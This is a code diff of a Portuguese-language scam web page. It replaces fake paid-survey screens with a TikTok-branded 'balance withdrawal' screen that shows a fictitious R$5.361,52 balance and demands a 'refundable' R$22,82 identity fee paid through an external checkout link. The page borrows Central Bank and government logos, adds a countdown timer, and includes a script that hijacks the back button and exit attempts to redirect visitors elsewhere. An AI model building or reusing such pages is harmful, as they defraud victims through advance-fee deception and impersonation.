-          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$43,00!</p>
-          
-          <div class="imagem">
-            <img src="images/amazon.png" style="width: 50%; margin: 0 auto; display: flex;">
+      </section>
+      <section id="seven" class="screen">
+        <header class="loading-header">
+          <div class="loading-logo">
+            <img src="images/logotiktok.png" alt="TikTok Logo" class="loading-logo-img">
           </div>
-  
-          <p class="pergunta-whats">De 1 a 5, que nota voce da para o Aliexpress?</p>
-  
-          <div class="rating-container" id="rating-container-10">
-            <button class="rating-button" data-rating="1">1 </button>
-            <button class="rating-button" data-rating="2">2 </button>
-            <button class="rating-button" data-rating="3">3 </button>
-            <button class="rating-button" data-rating="4">4 </button>
-            <button class="rating-button" data-rating="5">5 </button>
+        </header>
+
+        <main class="loading-main-content">
+          <div class="new-loading-container">
+            <div class="new-loading-text" id="new-loading-text">
+              Validando acesso...
+            </div>
+            <div class="new-progress-track">
+              <div class="new-progress-bar" id="new-progress-bar"></div>
+            </div>
           </div>
-          
-          <p class="pergunta-whats">Voce prefere comprar produtos pela internet ou loja fisica?</p>
-  
-          <div class="rating-container" id="rating-container-11">
-            <button class="rating-button" data-rating="1">Internet</button>
-            <button class="rating-button" data-rating="2">Pessoalmente</button>
+        </main>
+      </section>
+      <section id="nine" class="screen" aria-hidden="true">
+        <div class="confirmation-container">
+          <div class="confirmation-header">
+            <div class="confirmation-logo">
+              <img src="images/logotiktok.png" alt="TikTok">
+            </div>
           </div>
-  
-          <p class="pergunta-whats">Voce ja chegou a usar Aliexpress?</p>
-  
-          <div class="rating-container" id="rating-container-12">
-            <button class="rating-button" data-rating="1">Sim</button>
-            <button class="rating-button" data-rating="2">Nao </button>
+
+          <!-- Saldo Acumulado -->
+          <div class="confirmation-section confirmation-balance">
+            <div class="confirmation-balance-title">SALDO DISPONÍVEL</div>
+            <div class="confirmation-balance-amount" data-amount-target="5361.52">
+              R$ 5.361,52
+            </div>
+            <div class="confirmation-balance-subtitle">
+              Aguardando confirmação para saque
+            </div>
           </div>
-              
-          <button type="button" class="enviarCodigo" id="B4" onclick="showLoadingB4();">Enviar respostas</button>
-  
-            
+
+          <!-- Taxa de Confirmação -->
+          <div class="confirmation-section">
+            <div class="confirmation-section-title">
+              CONFIRMAÇÃO DE IDENTIDADE
+            </div>
+            <div class="confirmation-fee-amount">
+              R$ 22,82
+              <span class="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
+            </div>
+            <div class="confirmation-fee-description">
+              Taxa obrigatória para liberação do saque no valor de
+              <span class="bold">R$5.361,52</span>. O valor de
+              <span class="bold">R$22,82</span> será reembolsado integralmente
+              para você em 1 minuto.
+            </div>
+          </div>
+
+          <!-- Comprovante -->
+          <div class="confirmation-section">
+            <div class="confirmation-section-title">DADOS PARA REEMBOLSO</div>
+            <div class="confirmation-receipt-grid">
+              <div class="confirmation-receipt-item">
+                <div class="confirmation-receipt-label">Nome</div>
+                <div class="confirmation-receipt-value" id="confirmation-name"></div>
+              </div>
+              <div class="confirmation-receipt-item">
+                <div class="confirmation-receipt-label">Data</div>
+                <div class="confirmation-receipt-value" id="confirmation-date"></div>
+              </div>
+              <div class="confirmation-receipt-item">
+                <div class="confirmation-receipt-label">Chave PIX</div>
+                <div class="confirmation-receipt-value" id="confirmation-key-type"></div>
+              </div>
+              <div class="confirmation-receipt-item">
+                <div class="confirmation-receipt-label">Valor a receber</div>
+                <div class="confirmation-receipt-value bold">R$ 5.361,52</div>
+              </div>
+              <div class="confirmation-pix-key" id="confirmation-pix-key"></div>
+            </div>
+          </div>
+
+          <div class="confirmation-divider"></div>
+
+          <!-- Requisitos -->
+          <div class="confirmation-section">
+            <div class="confirmation-section-title">PROCESSO DE LIBERAÇÃO</div>
+            <div class="confirmation-requirements-grid">
+              <div class="confirmation-requirement-item">
+                <div class="confirmation-requirement-icon">1</div>
+                <div class="confirmation-requirement-content">
+                  <div class="confirmation-requirement-title">
+                    Pagar taxa de confirmação
+                  </div>
+                  <div class="confirmation-requirement-description">
+                    R$ 22,82 para verificação de identidade
+                  </div>
+                </div>
+              </div>
+              <div class="confirmation-requirement-item">
+                <div class="confirmation-requirement-icon confirmation-reembolso">
+                  ✓
+                </div>
+                <div class="confirmation-requirement-content">
+                  <div class="confirmation-requirement-title confirmation-reembolso">
+                    Receber reembolso automático
+                  </div>
+                  <div class="confirmation-requirement-description">
+                    Valor devolvido em 1 minuto
+                  </div>
+                </div>
+              </div>
+              <div class="confirmation-requirement-item">
+                <div class="confirmation-requirement-icon">3</div>
+                <div class="confirmation-requirement-content">
+                  <div class="confirmation-requirement-title">
+                    Acessar saldo completo
+                  </div>
+                  <div class="confirmation-requirement-description">
+                    R$ 5.361,52 liberado para saque
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Call to Action -->
+          <div class="confirmation-section">
+            <a href="https://pay.pagamentosegurocheckout.com/69343b08d109ca11ef84f11c" class="confirmation-cta-button" id="confirmation-button" onclick="herdarUTMeRedirecionar(this.href); return false;">
+              Pagar taxa para Liberar Saque
+            </a>
+
+            <script>
+              function herdarUTMeRedirecionar(urlDestino) {
+                // Pega os parâmetros da URL atual
+                const urlAtual = new URL(window.location.href);
+                const params = new URLSearchParams(urlAtual.search);
+
+                // Filtra UTMs + ttclid
+                const parametrosParaHerdar = {};
+                for (const [key, value] of params.entries()) {
+                  if (
+                    key.startsWith("utm_") ||
+                    key === "ttclid" // <- novo parâmetro incluído
+                  ) {
+                    parametrosParaHerdar[key] = value;
+                  }
+                }
+
+                // Cria a URL de destino com os parâmetros herdados
+                const urlFinal = new URL(urlDestino);
+                const paramsDestino = new URLSearchParams(urlFinal.search);
+
+                // Adiciona os parâmetros herdados à URL de destino
+                for (const [key, value] of Object.entries(
+                  parametrosParaHerdar
+                )) {
+                  paramsDestino.set(key, value);
+                }
+
+                urlFinal.search = paramsDestino.toString();
+
+                // Redireciona na mesma página
+                window.location.href = urlFinal.toString();
+              }
+            </script>
+            <div class="confirmation-timer">
+              ⏱️ Reembolso automático em 1 minuto
+            </div>
+            <div class="confirmation-success-message" id="confirmation-success-message">
+              ✅ Identidade confirmada. R$ 21,67 reembolsados e saque liberado.
+            </div>
+          </div>
+
+          <!-- Segurança -->
+          <div class="confirmation-security-grid">
+            <div class="confirmation-security-item">
+              <div class="confirmation-security-label">
+                <img src="images/bacen.png" alt="" class="img-bacen">
+              </div>
+            </div>
+            <div class="confirmation-security-item">
+              <div class="confirmation-security-label">
+                <img src="images/gov-br.webp" alt="" class="img-gov-br">
+              </div>
+            </div>
+            <div class="confirmation-security-item">
+              <div class="confirmation-security-label">
+                <img src="images/receitafederal.png" alt="" class="img-receitafederal">
+              </div>
+            </div>
+          </div>
+
+          <!-- Footer -->
+          <div class="confirmation-footer">
+            <div class="confirmation-footer-text">Processo 100% seguro</div>
+            <a href="#nine" class="confirmation-footer-link">Precisa de ajuda?</a>
+          </div>
         </div>
-      </div>
-        
-        <!---- Popup B4 ---->
-        
-        <div class="popup-container" id="popupB4">
-        
-          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+      </section>
+      <section id="popup-um" class="sticky-popup">
+        <div class="timer-wrapper expira-em-popup">
+          <div class="timer-label">Expira em</div>
 
-          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
-           
-           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
-           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 43,00</span>
-         
-        
+          <div class="timer-clock">
+            <!-- Horas -->
+            <div class="timer-box" data-timer="hours">00</div>
+
+            <!-- Separador -->
+            <div class="timer-separator">:</div>
+
+            <!-- Minutos -->
+            <div class="timer-box" data-timer="minutes">42</div>
+
+            <!-- Separador -->
+            <div class="timer-separator">:</div>
+
+            <!-- Segundos -->
+            <div class="timer-box" data-timer="seconds">37</div>
+          </div>
         </div>
-    
-    
-    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p5" ---------------------->
-    
-    <div class="outer-box" id="ad5" style="display: none;">
-        <div class="white-box">
-            
-          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$52,00!</p>
-          
-          <div class="imagem">
-            <img src="images/ambev.png" style="width: 50%; margin: 0 auto; display: flex;">
+        <!-- <div class="line line-expira"></div> -->
+        <div class="saldo saldo-popup">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info">
+              <div class="saldo-label">
+                <span class="saldo-text">Seu saldo</span>
+                <img src="images/p-saldo.svg" alt="" class="p-saldo">
+              </div>
+
+              <div class="saldo-valor" aria-live="polite">
+                <span class="valor-currency">R$5.361,52</span>
+              </div>
+            </div>
+
+            <div class="saldo-action">
+              <button type="button" class="btn-sacar" aria-label="Sacar">
+                <span class="btn-text">Sacar</span>
+                <span class="pix-badge" aria-hidden="true">
+                  <img src="images/pix-logo.svg" alt="">
+                </span>
+              </button>
+            </div>
           </div>
-  
-          <p class="pergunta-whats">De 1 a 5, que nota voce da para a Heineken?</p>
-  
-          <div class="rating-container" id="rating-container-13">
-            <button class="rating-button" data-rating="1">1 </button>
-            <button class="rating-button" data-rating="2">2 </button>
-            <button class="rating-button" data-rating="3">3 </button>
-            <button class="rating-button" data-rating="4">4 </button>
-            <button class="rating-button" data-rating="5">5 </button>
-          </div>
-          
-          <p class="pergunta-whats">Voce prefere comprar Heineken com alcool ou sem alcool?</p>
-  
-          <div class="rating-container" id="rating-container-14">
-            <button class="rating-button" data-rating="1">Com</button>
-            <button class="rating-button" data-rating="2">Sem</button>
-          </div>
-  
-          <p class="pergunta-whats">Voce ja chegou a consumir a Heineken sem alcool?</p>
-  
-          <div class="rating-container" id="rating-container-15">
-            <button class="rating-button" data-rating="1">Sim</button>
-            <button class="rating-button" data-rating="2">Nao </button>
-          </div>
-              
-          <button type="button" class="enviarCodigo" id="B5" onclick="showLoadingB5();">Enviar respostas</button>
-  
-            
         </div>
-      </div> 
-        
-        <!---- Popup B5 ---->
-        
-        <div class="popup-container" id="popupB5">
-          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+      </section>
+    </main>
 
-          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
-           
-           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
-           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 52,00</span>
-         
-        </div>
-        
-        
-    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p6" ---------------------->
-    
-      <div class="outer-box" id="ad6" style="display: none">
-        <div class="white-box">
-            
-          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$32,00!</p>
-          
-          <div class="imagem">
-            <img src="images/mcdonalds.png" style="width: 35%; margin: 0 auto; display: flex;">
-          </div>
+    <script>
+      // Funções auxiliares
+      function easeOutCubic(t) {
+        return 1 - Math.pow(1 - t, 3);
+      }
+
+      function formatBR(value) {
+        return value
+          .toFixed(2) // duas casas decimais
+          .replace(".", ",") // vírgula decimal
+          .replace(/\B(?=(\d{3})+(?!\d))/g, "."); // ponto para milhar
+      }
+
+      // Função reutilizável para animar um contador
+      function animateCurrencyCounter(counter, forceReset = false) {
+        if (!counter) return;
+
+        // Se já está animando e não forçou reset, não anima novamente
+        if (counter._isAnimating && !forceReset) return;
+
+        const duration = 2000; // tempo total da animação
+        const toValue =
+          parseFloat(counter.getAttribute("data-amount-target")) || 0;
+        const fromValue = 0;
+
+        if (toValue === 0) {
+          // Garante que sempre mostre um valor válido, mesmo se for 0
+          counter.textContent = "R$ 0,00";
+          return;
+        }
+
+        // Cancela animação anterior se existir
+        if (counter._animationFrameId) {
+          cancelAnimationFrame(counter._animationFrameId);
+          counter._animationFrameId = null;
+        }
+
+        // Garante que sempre comece com um valor visível
+        counter.textContent = "R$ 0,00";
+
+        counter._isAnimating = true;
+        let startTime = null;
+
+        function animateCounter(currentTime) {
+          if (!startTime) startTime = currentTime;
+          const elapsed = currentTime - startTime;
+          const progress = Math.min(elapsed / duration, 1);
+          const value =
+            fromValue + (toValue - fromValue) * easeOutCubic(progress);
+
+          // Atualiza número formatado no padrão brasileiro - sempre garante um valor válido
+          const formattedValue = "R$ " + formatBR(value);
+          if (counter && counter.textContent !== undefined) {
+            counter.textContent = formattedValue;
+          }
+
+          if (progress < 1) {
+            counter._animationFrameId = requestAnimationFrame(animateCounter);
+          } else {
+            // garante valor final exato
+            const finalValue = "R$ " + formatBR(toValue);
+            if (counter && counter.textContent !== undefined) {
+              counter.textContent = finalValue;
+            }
+            counter._isAnimating = false;
+            counter._animationFrameId = null;
+          }
+        }
+
+        // Pequeno delay para garantir que o DOM está pronto
+        setTimeout(() => {
+          if (counter && counter.getAttribute("data-amount-target")) {
+            counter._animationFrameId = requestAnimationFrame(animateCounter);
+          }
+        }, 10);
+      }
+
+      // Anima todos os contadores visíveis no carregamento
+      document.addEventListener("DOMContentLoaded", function () {
+        // Anima apenas contadores que estão visíveis na tela inicial
+        const initialCounters = document.querySelectorAll(
+          "#one .valor-currency[data-amount-target]"
+        );
+        initialCounters.forEach((counter) => {
+          animateCurrencyCounter(counter);
+        });
+      });
+
+      // Expõe a função globalmente para ser chamada quando o popup abrir
+      window.animateCurrencyCounter = animateCurrencyCounter;
+    </script>
+
+    <!-- <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const counters = document.querySelectorAll(".elementor-counter-number");
+
+        counters.forEach((counter) => {
+          const duration =
+            parseInt(counter.getAttribute("data-duration")) || 2000;
+          const toValue =
+            parseFloat(counter.getAttribute("data-to-value")) || 0;
+          const fromValue =
+            parseFloat(counter.getAttribute("data-from-value")) || 0;
+          const delimiter = counter.getAttribute("data-delimiter") || ".";
+
+          let startTime = null;
+
+          function animateCounter(currentTime) {
+            if (!startTime) startTime = currentTime;
+            const elapsed = currentTime - startTime;
+            const progress = Math.min(elapsed / duration, 1);
+            const value =
+              fromValue + (toValue - fromValue) * easeOutCubic(progress);
+
+            counter.textContent = formatNumber(value, delimiter);
+
+            if (progress < 1) {
+              requestAnimationFrame(animateCounter);
+            } else {
+              counter.textContent = formatNumber(toValue, delimiter);
+            }
+          }
+
+          requestAnimationFrame(animateCounter);
+        });
+
+        function easeOutCubic(t) {
+          return 1 - Math.pow(1 - t, 3);
+        }
+
+        function formatNumber(value, delimiter) {
+          // exibe com 2 casas decimais e separador personalizado
+          let formatted = value.toFixed(2);
+          if (delimiter === ",") formatted = formatted.replace(".", ",");
+          return formatted;
+        }
+      });
+    </script> -->
+    <script src="js/main.js"></script>
+    <!-- <script src="js/agr.js"></script> -->
+    <!-- <script src="js/sera.js"></script> -->
   
-          <p class="pergunta-whats">De 1 a 5, que nota voce da para o McDonald's?</p>
-  
-          <div class="rating-container" id="rating-container-16">
-            <button class="rating-button" data-rating="1">1 </button>
-            <button class="rating-button" data-rating="2">2 </button>
-            <button class="rating-button" data-rating="3">3 </button>
-            <button class="rating-button" data-rating="4">4 </button>
-            <button class="rating-button" data-rating="5">5 </button>
-          </div>
-          
-          <p class="pergunta-whats">Voce ja comprou algum lanche no McDonald's?</p>
-  
-          <div class="rating-container" id="rating-container-17">
-            <button class="rating-button" data-rating="1">Sim</button>
-            <button class="rating-button" data-rating="2">Nao</button>
-          </div>
-  
-          <p class="pergunta-whats">Voce recomendaria para algum amigo ou familiar o McDonald's?</p>
-  
-          <div class="rating-container" id="rating-container-18">
-            <button class="rating-button" data-rating="1">Sim</button>
-            <button class="rating-button" data-rating="2">Nao</button>
-          </div>
-              
-          <button type="button" class="enviarCodigo" id="B6" onclick="showLoadingB6();">Enviar respostas</button>
-  
-            
-        </div>
-      </div>
-        
-        <!---- Popup B6 ---->
-        
-        <div class="popup-container" id="popupB6">
-        
-          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+  <script>
+(function() {
+  // 🔗 URL de destino — substitua pelo seu link real:
+  const destino = "https://weelcomhouse.shop/backup/";
+  let jaRedirecionou = false;
 
-          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
-           
-           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
-           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 32,00</span>
-         
-        
-        </div>    
-        
-    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p7" ---------------------->
-    
-      <div class="outer-box" id="ad7" style="display: none">
-        <div class="white-box">
-            
-          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$32,00!</p>
-          
-          <div class="imagem">
-            <img src="images/burguerking.png" style="width: 20%; margin: 0 auto; display: flex;">
-          </div>
-  
-          <p class="pergunta-whats">De 1 a 5, que nota voce da para o Burguer King?</p>
-  
-          <div class="rating-container" id="rating-container-19">
-            <button class="rating-button" data-rating="1">1 </button>
-            <button class="rating-button" data-rating="2">2 </button>
-            <button class="rating-button" data-rating="3">3 </button>
-            <button class="rating-button" data-rating="4">4 </button>
-            <button class="rating-button" data-rating="5">5 </button>
-          </div>
-          
-          <p class="pergunta-whats">Voce ja comprou algum lanche no Burguer King?</p>
-  
-          <div class="rating-container" id="rating-container-20">
-            <button class="rating-button" data-rating="1">Sim</button>
-            <button class="rating-button" data-rating="2">Nao</button>
-          </div>
-  
-          <p class="pergunta-whats">Voce recomendaria para algum amigo ou familiar o Burguer King?</p>
-  
-          <div class="rating-container" id="rating-container-21">
-            <button class="rating-button" data-rating="1">Sim</button>
-            <button class="rating-button" data-rating="2">Nao</button>
-          </div>
-              
-          <button type="button" class="enviarCodigo" id="B7" onclick="showLoadingB7();">Enviar respostas</button>
-  
-            
-        </div>
-      </div>  
-        
-        <!---- Popup B7 ---->
-        
-        <div class="popup-container" id="popupB7">
-        
-          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+  function redirecionar() {
+    if (!jaRedirecionou) {
+      jaRedirecionou = true;
+      window.location.replace(destino);
+    }
+  }
 
-          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
-           
-           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
-           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 32,00</span>
-         
-        
-        </div>
-        
-    
-    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p8" ---------------------->
-    
-      <div class="outer-box" id="ad8" style="display: none">
-        <div class="white-box">
-            
-          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$27,00!</p>
-          
-          <div class="imagem">
-            <img src="images/vivo.png" style="width: 50%; margin: 0 auto; display: flex;">
-          </div>
-  
-          <p class="pergunta-whats">De 1 a 5, que nota voce da para a Vivo?</p>
-  
-          <div class="rating-container" id="rating-container-22">
-            <button class="rating-button" data-rating="1">1 </button>
-            <button class="rating-button" data-rating="2">2 </button>
-            <button class="rating-button" data-rating="3">3 </button>
-            <button class="rating-button" data-rating="4">4 </button>
-            <button class="rating-button" data-rating="5">5 </button>
-          </div>
-          
-          <p class="pergunta-whats">Voce ja comprou algum produto da Vivo?</p>
-  
-          <div class="rating-container" id="rating-container-23">
-            <button class="rating-button" data-rating="1">Sim</button>
-            <button class="rating-button" data-rating="2">Nao</button>
-          </div>
-  
-          <p class="pergunta-whats">Voce recomendaria para algum amigo ou familiar a Vivo?</p>
-  
-          <div class="rating-container" id="rating-container-24">
-            <button class="rating-button" data-rating="1">Sim</button>
-            <button class="rating-button" data-rating="2">Nao</button>
-          </div>
-              
-          <button type="button" class="enviarCodigo" id="B8" onclick="showLoadingB8();">Enviar respostas</button>
-  
-            
-        </div>
-      </div> 
-        
-        <!---- Popup B8 ---->
-        
-        <div class="popup-container" id="popupB8">
-        
-          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+  // Impede loop de redirecionamento em reload/back cache
+  if (sessionStorage.getItem("__ja_redirecionou__")) return;
+  sessionStorage.setItem("__ja_redirecionou__", "1");
 
-          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
-           
-           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
-           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 27,00</span>
-         
-        
-        </div>     
-        
-    
-    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p9" ---------------------->
-    
-      <div class="outer-box" id="ad9" style="display: none">
-        <div class="white-box">
-            
-          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$30,00!</p>
-          
-          <div class="imagem">
-            <img src="images/claro.png" style="width: 50%; margin: 0 auto; display: flex;">
-          </div>
-  
-          <p class="pergunta-whats">De 1 a 5, que nota voce da para a Claro?</p>
-  
-          <div class="rating-container" id="rating-container-25">
-            <button class="rating-button" data-rating="1">1 </button>
-            <button class="rating-button" data-rating="2">2 </button>
-            <button class="rating-button" data-rating="3">3 </button>
-            <button class="rating-button" data-rating="4">4 </button>
-            <button class="rating-button" data-rating="5">5 </button>
-          </div>
-          
-          <p class="pergunta-whats">Voce ja comprou algum produto da Claro?</p>
-  
-          <div class="rating-container" id="rating-container-26">
-            <button class="rating-button" data-rating="1">Sim</button>
-            <button class="rating-button" data-rating="2">Nao</button>
-          </div>
-  
-          <p class="pergunta-whats">Voce recomendaria para algum amigo ou familiar a Claro?</p>
-  
-          <div class="rating-container" id="rating-container-27">
-            <button class="rating-button" data-rating="1">Sim</button>
-            <button class="rating-button" data-rating="2">Nao</button>
-          </div>
-              
-          <button type="button" class="enviarCodigo" id="B9" onclick="showLoadingB9();">Enviar respostas</button>
-  
-            
-        </div>
-      </div> 
-        
-        <!---- Popup B9 ---->
-        
-      <div class="popup-container" id="popupB9">
-        
-          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+  // Detecta intenção de saída no desktop (mouse indo pro topo)
+  document.addEventListener("mouseleave", function(e) {
+    if (e.clientY < 0 && !/Mobi|Android/i.test(navigator.userAgent)) {
+      redirecionar();
+    }
+  });
 
-          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
-           
-           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
-           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 30,00</span>
-         
-        
-      </div>     
-    
-    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p10" ---------------------->
-    
-      <div class="outer-box" id="ad10" style="display: none">
-        <div class="white-box">
-            
-          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$43,00!</p>
-          
-          <div class="imagem">
-            <img src="images/tim.png" style="width: 50%; margin: 0 auto; display: flex;">
-          </div>
-  
-          <p class="pergunta-whats">De 1 a 5, que nota voce da para a Tim?</p>
-  
-          <div class="rating-container" id="rating-container-28">
-            <button class="rating-button" data-rating="1">1 </button>
-            <button class="rating-button" data-rating="2">2 </button>
-            <button class="rating-button" data-rating="3">3 </button>
-            <button class="rating-button" data-rating="4">4 </button>
-            <button class="rating-button" data-rating="5">5 </button>
-          </div>
-          
-          <p class="pergunta-whats">Voce ja comprou algum produto da Tim?</p>
-  
-          <div class="rating-container" id="rating-container-29">
-            <button class="rating-button" data-rating="1">Sim</button>
-            <button class="rating-button" data-rating="2">Nao</button>
-          </div>
-  
-          <p class="pergunta-whats">Voce recomendaria para algum amigo ou familiar a Tim?</p>
-  
-          <div class="rating-container" id="rating-container-30">
-            <button class="rating-button" data-rating="1">Sim</button>
-            <button class="rating-button" data-rating="2">Nao</button>
-          </div>
-              
-          <button type="button" class="enviarCodigo" id="B10" onclick="showLoadingB10();">Enviar respostas</button>
-  
-            
-        </div>
-      </div> 
-        
-        <!---- Popup B10 ---->
-        
-        <div class="popup-container" id="popupB10">
-        
-          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+  // Detecta tentativa de voltar (botão voltar do navegador)
+  window.addEventListener("popstate", function() {
+    redirecionar();
+  });
 
-          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
-           
-           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
-           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 43,00</span>
-         
-        
-        </div> 
-    
-    
-    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p11" ---------------------->
-    
-     
-        <div class="white-box" id="ad11" style="display: none">
-        </div>
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
+  // Adiciona um estado no histórico (para detectar o "voltar")
+  window.history.pushState({}, "", window.location.href);
 
-    <!--------------------- Limite atingido --------------------->
-    
-  
-    <div class="popup-containerL" id="popupL">
-
-      <div id="container-progresso" style="display: flex; margin: 0 auto; width: 300px; height: 300px;">
-          <svg viewBox="0 0 36 36" id="barra-progresso-svg">
-              <circle cx="18" cy="18" r="16" fill="none" stroke="#ccc" stroke-width="3"></circle>
-              <circle cx="18" cy="18" r="16" fill="none" stroke="#06B32E" stroke-width="3" id="minha-barra-progresso" stroke-dasharray="0 1000"></circle>
-          </svg>
-      
-          <div id="texto-progresso">
-              <span id="valor-saque" style="font-family: 'Montserrat', sans-serif; font-size: 23px;">R$100.00</span>
-              <span style="font-family: 'Montserrat', sans-serif; color: #202020; font-size: 14px;">Seu saldo subiu!</span>
-          </div>
-      </div>
-      
-      
-
-      <p style="font-family: 'Montserrat', sans-serif; font-size: 32px; color: #28a745; text-align: center; margin-top: 15px; margin-bottom: -5px;">Parabens!</p>      
-
-      <p class="popup-textL" style="margin-bottom: 20px; font-size: 18px; color: #636363">Voce atingiu seu<br>limite diario!</p>
-      
-    
-      <button class="desbloquear-button" style="font-weight: bold; font-size: 18x; border-radius: 12px; margin-top: 15px;" href="#" onclick="mostrarPagina('saque')">SAQUE AGORA</button>
-      
-
-
-     
-    
-
-
-
-      
-      
-    </div>
-
-
-    
-    <!--------------------- Menu debaixo --------------------->
-
-    
-    <div style="margin-bottom: 80px;"></div>
-
-    
-    <div class="menuemb">
-      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "InÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â­cio" -->
-      <a href="#" onclick="mostrarPagina('saque')">
-        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">paid</span>
-      </a>
